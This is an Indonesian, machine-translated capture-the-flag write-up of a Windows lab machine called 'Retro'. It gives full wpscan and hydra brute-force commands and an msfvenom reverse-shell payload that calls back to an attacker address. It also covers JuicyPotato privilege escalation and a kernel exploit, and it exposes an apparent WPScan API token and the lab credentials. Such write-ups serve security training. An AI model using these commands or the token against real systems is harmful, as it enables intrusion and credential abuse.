---
title: "Retro"
description: "InfoGath Nmap: Port 80 Dirsearch: kami mengidentifikasi bahwa aplikasi tersebut menggunakan Wordpress, jadi mari kita pindai menggunakan WPScan. Eksploitasi Wordpress WPScan: mari kita lakukan serangan brute force"
lang: "id"
translationKey: "retro"
category: "lab-writeups"
tags: ["Lab", "Wordpress", "Juicy Potato", "CVE-2017-0213", "Windows server 2016", "OS Version:                10.0.14393 N/A Build 14393", "Windows"]
publishDate: "2025-01-08"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "1755fca1-ed80-809c-9a80-d189e93a31be"
notionUrl: "https://app.notion.com/p/Retro-1755fca1ed80809c9a80d189e93a31be"
notionLastEdited: "2025-06-08T13:28:00.000Z"
---

# InfoGath

Nmap:

![](/images/retro/ee4f24b09058.png)

## Pelabuhan 80

![](/images/retro/457c70ab1c67.png)

Dirsearch :

![](/images/retro/b6b3f5fe6e1e.png)

![](/images/retro/23adbc6b31b9.png)

Kami mengidentifikasi bahwa aplikasi tersebut menggunakan Wordpress, jadi mari kita pindai menggunakan WPScan.

# Manfaatkan WordPress

WPScan :

```bash
wpscan --url http://10.10.122.119/retro/ -eu --api-token HgrZozFw3YMdEMsOCxIWuKSZtsaGSti6l7qi4iLsaI0
```

![](/images/retro/eee20f016290.png)

Mari kita lakukan serangan brute force pada halaman login menggunakan pengguna **wade**. Kita menemukan halaman login di bagian bawah halaman utama.

![](/images/retro/37e22fa95000.png)

![](/images/retro/5ed9ebe4d5e0.png)

```bash
wpscan --url http://10.10.122.119/retro/wp-login.php -U wade -P /usr/share/wordlists/rockyou.txt 
# cause wpscan take too long so i switch the tool using hydra
hydra -l wade -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt 10.10.122.119 -V http-post-form "/retro/wp-login.php:log=Wade&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```

![](/images/retro/14bdd120dd0e.png)

Yey, kita mendapatkan kredensial yang valid `wade : parzival`, mari kita gunakan untuk masuk ke WordPress.

![](/images/retro/43bb7faeaca9.png)

Buka **editor tema**, edit file 404.php, ubah menjadi `ivan sincek revshell`, lalu akses halaman [`/wp-content/themes/90sretro/404.php`](http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php) untuk memicu revshell.

![](/images/retro/5da059ce0b4c.png)

![](/images/retro/c49315c863b8.png)

Oke, setelah mendapatkan revshell dan melakukan beberapa enumerasi, pengguna retro kita di revshell tidak memiliki izin tulis pada file apa pun di sistem, jadi saya mencari cara lain.

Saya mencoba menggunakan kembali kredensial yang saya dapatkan pada langkah sebelumnya saat masuk ke Wordpress (`wade:parzival`) pada sesi RDP.

![](/images/retro/9695f22f8f5f.png)

lalu voila, kami mendapat sesi di RDP sebagai Wade dan mendapat bendera.

Oke, kita punya 2 pengguna, Wade dan Retro, mari kita periksa satu per satu.

# WinPriv

## **Privesc SeImpersonate Menggunakan JuicyPotato**

Pada pengguna `iis apppool\retro` kami mendapatkan SeImpersonatePrivilege tetapi kami tidak dapat menyimpan skrip eksploitasi kami di direktori mana pun pada sistem target kami, jadi kami membuat direktori kami sendiri di direktori `C:\`.

![](/images/retro/06fc1b22ec70.png)

**Pilihan 1 kentang yang lezat**

pertama-tama kita transfer kentang lezat kita dan revshell.exe berbahaya kita.

```bash
# our revshell is generate using msfvenom like the following
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.17.49.139 lport=82 -f exe -o shell-thm.exe
```

![](/images/retro/96ef7b5d4026.png)

Kemudian menjalankan perintah "juicy potato" dan voila, kita mendapatkan pengguna dengan otoritas seperti ini.

```bash
.\juicy.exe -t * -p .\shell.exe -l 82
```

![](/images/retro/ebb5bfcb3b2b.png)

**Pilihan 2 kentang lezat**

```bash
.\juicy.exe -l 443 -p shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

![](/images/retro/d2f8b2511b1d.png)

## Eksploitasi Kernel

pada pengguna **Wade** yang menjalankan perintah `systeminfo`.

```bash
Host Name:                 RETROWEB
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00377-60000-00000-AA325
Original Install Date:     12/8/2019, 10:50:43 PM
System Boot Time:          6/7/2025, 6:29:17 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,251 MB
Virtual Memory: Max Size:  3,200 MB
Virtual Memory: Available: 2,322 MB
Virtual Memory: In Use:    878 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB3192137
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.228.40
                                 [02]: fe80::a010:32a5:bfeb:acea
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Kami menyadari bahwa kernel kami (Build 14393) adalah Windows Server 2016 Standard yang rentan. Mari kita lakukan enumerasi kerentanan tersebut.

![](/images/retro/2f6f105d5e0d.png)

Setelah melakukan riset tentang [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits), kami menemukan metode peningkatan hak akses untuk mesin Windows 2016 kami di GitHub oleh SecWiki.

![](/images/retro/49ea384f5175.png)

Oke, sekarang mari kita kirimkan exploit ke target. Kemudian jalankan skrip exploit.

![](/images/retro/10526a627625.png)

Voila, kita sekarang punya akun administrator.

![](/images/retro/5cf0846e1cf0.png)

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
